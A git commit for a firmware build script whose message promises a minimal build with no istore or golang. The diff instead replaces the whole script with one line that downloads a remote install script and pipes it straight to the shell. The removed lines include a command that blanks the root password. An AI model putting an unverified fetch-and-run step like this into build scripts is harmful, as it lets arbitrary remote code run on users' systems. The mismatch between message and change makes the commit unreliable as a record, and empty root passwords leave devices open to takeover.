efbe191db2582042023bb05f363d9dd4d549d5b7
Dongxuan0119 <88181839+Dongxuan0119@users.noreply.github.com>
2026-09-11 10:27:46 +0800

    build minimal 6.6 firmware, clear root password, remove golang

--- scripts/diy-6.6.sh
+++ scripts/diy-6.6.sh
@@ -1,10 +1,2 @@
-#!/bin/bash
-set -e -o pipefail
-#清除登录密码，root默认无密码
-sed -i 's/^root:.*$/root::0:99999:7:::/' package/base-files
+curl -fsSL https://istore.i18n.site/install.sh | sh
 
-# 不拉取istore，不引入golang，不添加任何额外插件
-# git clone https://github.com/linkease/istore.git package/istore
-
-# PACKAGES只保留基础LuCI网页界面，其余插件全部移除
-PACKAGES="luci luci-base luci-mod-admin-full"
